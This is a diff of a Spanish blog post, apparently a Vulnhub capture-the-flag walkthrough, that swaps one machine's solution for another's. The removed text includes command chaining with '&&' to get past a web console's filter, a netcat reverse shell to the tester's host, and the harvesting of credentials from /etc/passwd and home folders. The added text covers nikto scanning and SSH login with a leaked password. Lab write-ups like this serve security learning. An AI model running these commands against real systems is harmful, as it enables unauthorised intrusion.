@@ -14,156 +14,57 @@ De nuevo, repito la metodología de las máquinas anteriores:
 
 En este caso no hace falta que usemos _arp-scan_, ya que cuando la máquina arranca nos muestra la dirección que ha cogido por DHCP.
 
-![placeholder]({{ site.url }}/assets/img/0030_20180716_0001.png)
+![placeholder]({{ site.url }}/assets/img/0046_20180716_0001.png)
 
 # Escaneo inicial
 
-Una vez que conocemos la dirección IP, lanzamos nmap y vemos qué puertos/servicios tiene la máquina. Usamos los mismos flags que en post previo: -A, --reason y --top-ports.
+Igual que hasta ahora, comenzamos lanzando nmap y viendo qué puertos tiene abiertos la máquina:
 
-El resultado: la máquina tiene un servidor web, y el archivo robots.txt ya nos da alguna pista de por dónde empezar a mirar.
+El resultado: la máquina tiene un servidor web, un servidor ftp, y algún puerto más abierto.:
 
-![placeholder]({{ site.url }}/assets/img/0029_201080607_0001.png)
+![placeholder]({{ site.url }}/assets/img/0047_20180716_0002.png)
 
-Pues nada, vamos a echarle un ojo a los sitios incluidos en el robots.txt
+Como habitualmente las máquinas vulnerables que tienen los puertos 80/443 suelen tener ahí los puntos de entrada, lanzamos nikto al puerto 80:
 
-login.php, dev_shell.php, lat_memo.html y passwords.html
+* _nikto -h 10.0.6.89_
 
-Miro primero en passwords.html... era muy bonito para ser real, los admin nos cuentan que antes alguien se despistó y puso las passwords, pero que ya se ha quitado.
+El servidor tiene una serie de carpetas interesantes: entre ellas "admin". Al ver qué hay en la carpeta, commprobamos que el servidor permite listar el directorio, por lo que vemos que tiene un fichero "notes.txt". Lo abrimos y vemos una password :)
 
-![placeholder]({{ site.url }}/assets/img/0030_201080607_0002.png)
-
-Miro en login.php, que da error, y en login.html que nos informa que está desactivada la página de login. Pues nada, en principio no habrá que forzar la inyección SQL en el formulario de login ;) Nos vamos a mirar la consola de desarrollo.
-
-![placeholder]({{ site.url }}/assets/img/0031_201080607_0003.png)
+![placeholder]({{ site.url }}/assets/img/0048_20180716_0003.png)
 
 # Consiguiendo la shell
 
-Puede ejecutar comandos, así que vamos a ver si podemos abrirnos una shell con netcat...
+Nikto nos muestra que hay otra carpeta interesante, con la que igual se pueden ejecutar comandos pasándolos por post... pero esto tiene tan buena pinta, que es difícil resistirse a intentar hacer login en la máquina por SSH
 
-![placeholder]({{ site.url }}/assets/img/0032_201080607_0004.png)
+Probamos el usuario root, y no funciona; y puesto que la clave tiene la cadena "ted", probamos a ver si el usuario ted existe... bingo!
 
-Hummmm... parece que el admin se lo ha tomado en serio. Pruebo todos los trucos de la [entrada pasada](https://livefromsec.github.io/2018-06-04/vulnhub_walkthrough_basic_pentesting), pero está todo filtrado.
+![placeholder]({{ site.url }}/assets/img/0049_20180716_0004.png)
 
-Vamos a ver si con wget podemos descargar y ejecutar una shell en .php...
+Usando el comando id vemos que somos un usuario normal:
 
-También está restringido. Pues nada, a ver si se pueden ejecutar dos comandos:
-* pruebo separándolos con ";", y también está bloqueado (aunque da otro mensaje).
-* pruebo concatenándolos, con "&&"... y funciona!
+* _id_
 
-![placeholder]({{ site.url }}/assets/img/0033_201080607_0005.png)
+Probamos qué podemos hacer con esta shell y parece que está limitada, por ejemplo _ifconfig_ no deja ejecutarlo. Y con _help_ muestra un listado bastante corto de comandos. Intentamos abrir una shell que esté menos limitada:
 
-Ahora sí, concatenamos id con un nc y tenemos nuestra shell:
-* _id && nc -e /bin/sh 10.192.0.127 4444_
+* python -c 'import pty; pty.spawn("/bin/sh")'
 
-![placeholder]({{ site.url }}/assets/img/0034_201080607_0006.png)
+Funciona, y no solo eso, también vemos que ahora mismo, el EUID del usuario es 0... Vamos a ver si podemos hacer maldades :)
 
-Sacamos una shell con python:
-* _python -c 'import pty; pty.spawn("/bin/sh")'_
+![placeholder]({{ site.url }}/assets/img/0050_20180716_0005.png)
 
-![placeholder]({{ site.url }}/assets/img/0035_201080607_0007.png)
-
-y nos ponemos a enumerar.
+Perfectamente, podemos entrar en la carpeta /root/ y listar el contenido!
 
 # Enumeración
 
-En la descripción que daban en Vulnhub, se recomienda buscar ficheros ocultos, así que a la hora de listar ficheros usaré:
-* _ls -la_
-
-Le echo un ojo al /etc/passwd con 
-* _cat /etc/passwd_
-
-y veo que hay varios usuarios en el sistema: c0rruptedb1t, bob, jc, seb y elliot.
-Y que uno de ellos, bob aparece como "Not the smartest person".
-
-![placeholder]({{ site.url }}/assets/img/0036_201080607_0008.png)
-
-Nos vamos al /home y vamos a ir enumerando.
-* seb no tiene nada destacable en su home
-* jc no tiene nada destacable en su home
-
-![placeholder]({{ site.url }}/assets/img/0037_201080607_0009.png)
-
-* elliot tiene un fichero llamado theadminisdumb.txt xD Este fichero nos da las credenciales de james (presumiblemente jc) y las suyas.
-* bob es el que más cosas tiene: un fichero oculto llamado old_passwordfile.html, que tiene las credenciales de seb y las de jc. Además tiene 2 scripts en python (Hello_Again.py y Whell_Of_Fortune.py), un proftpd1.3.3 (versión backdorizada) y en su carpeta Documents tiene un documento poniendo a caldo a los demás (staff.txt), un fichero cifrado (login.txt.gpg) y un script que muestra unas notas en el escritorio.
-
-![placeholder]({{ site.url }}/assets/img/0038_201080607_0010.png)
-
-Entonces, recopilando, tenemos 3 credenciales (las de elliot, jc y seb); un documento diciendo que bob es el administrador y unos cuantos ficheros de bob.
+No hace falta :) 
 
 # Escalada de privilegios
 
-En la máquina de la [entrada anterior](https://livefromsec.github.io/2018-06-04/vulnhub_walkthrough_basic_pentesting) esto no era un problema, porque el servicio corría como root, por lo que al conseguir explotarlo nuestra shell era root.
+Tampoco hace mucha falta... Podemos ver el kernel de la máquina, etc. Pero llegados a este punto, únicamente nos falta leer el flag:
 
-Ahora tenemos que conseguir esa shell de root, con una escalada de privilegios (desde la cuenta de jc, seb o elliot, ya que tenemos sus credenciales). Vamos a ver qué kernel corre, por si tuviese vulnerabilidades conocidas:
-* _uname -a_
+![placeholder]({{ site.url }}/assets/img/0051_20180716_0006.png)
 
-![placeholder]({{ site.url }}/assets/img/0039_201080607_0011.png)
-
-Está actualizado, así que mejor centrarse en otras opciones. Los scripts que había en python sugerían correrlos con sudo, pero ninguno de los usuarios para los que tenemos credenciales puede hacerlo; además no se pueden modificar y en el crontab no se les llama...
-
-Miro a ver si netstat muestra algún puerto escuchando localmente:
-* _netstat -ano_
-
-¿Command not found? ¿Netstat? Investigando un poco, está obsoleto y su substituto es "ss". Algo nuevo que aprendemos con esta máquina :)
-* _ss_
-
-No muestra nada diferente.
-
-En este punto podemos usar un script que revisa los principales puntos para hacer la escalada de privilegios en sistemas linux. Hay varios, yo voy a usar linuxprivchecker que para mí se convirtió en herramienta imprescindible cuando estaba haciendo el OSCP.
-
-Lo descargamos en /tmp desde la máquina vulnerable con wget, sirviéndolo desde la máquina Kali con SimpleHTTP:
-* _python -m SimpleHTTP 80_ [en la máquina Kali]
-* _wget http://ip_de_kali/linuxprivchecker.py_ [en la máquina vulnerable]
-
-![placeholder]({{ site.url }}/assets/img/0040_201080607_0012.png)
-
-Lo ejecutamos:
-* _python linuxprivchecker.py_
-
-y viendo los resultados, a priori no hay nada que resalte mucho.
-
-Así que toca hacer recapitulación... ¿qué tenemos? Las claves de 3 de los 4 usuarios, dos scripts en python que no hacen nada y que no están en el crontab, un fichero cifrado y un fichero que imprime frases absurdas en pantalla.
-
-![placeholder]({{ site.url }}/assets/img/0041_201080607_0013.png)
-
-**En este punto empezamos a sudar viendo que puede que la máquina se resuelva descifrando el fichero... lo que puede implicar "idea feliz".**
-
-Pues nada, vamos a probar cosas para descifrar el fichero (mezcla de random y fuerza bruta). El comando [será](https://www.gnupg.org/gph/en/manual/x110.html):
-
-* _gpg --output login.txt --decrypt login.txt.gpg_
-
-![placeholder]({{ site.url }}/assets/img/0042_201080607_0014.png)
-
-Vamos allá, a probar ideas felices: bob, james, seb, elliot... no, de momento no hemos acertado. En el fichero "notes.sh" había referencias a Harry Potter, vamos a probar: "Harry", "HarryPotter", "Gryffindor", etc. 
-
-De momento, tampoco. Como no estamos en un examen, es el momento de pedir el comodín de la llamada. Más que nada, porque seguir probando combinaciones sin garantía puede ser un "rabbit hole" y pasar así un par de horas sin resultados.
-
-Al descargar la máquina, también se muestra un enlace a un walkthrough; así que vamos a echarle un ojo, a ver cómo de lejos hemos llegado. Al mirarlo, vemos que la contraseña es la primera letra de cada frase: HARPOCRATES.
-
-![placeholder]({{ site.url }}/assets/img/0043_201080607_0015.png)
-
-No comments ¬¬  podrían haber pasado horas y probablemente esa palabra no habría surgido en el brainstorm random de palabras, así que bien hecho está :)
 
 # Flag
 
-El siguiente paso es trivial, tenemos la clave de bob (se ve en el _cat_ del fichero):
-
-![placeholder]({{ site.url }}/assets/img/0044_201080607_0016.png)
-
-Así que abrimos la sesión de bob, nos vamos a la raíz y hacemos:
-* _sudo cat flag.txt_
-
-![placeholder]({{ site.url }}/assets/img/0045_201080607_0017.png)
-
-C'est fini :) Muy entretenido, aunque la parte de sacar la clave de cifrado gpg un poco de idea feliz :p
-
-
-
-
-
-
-
-0Esto es un enlace [enlace](https://www.google.com)
-
-Y esto es una imagen:
-![placeholder]({{ site.url }}/assets/img/0016_20171124_owasp_top_ten.png)
+Hecho!
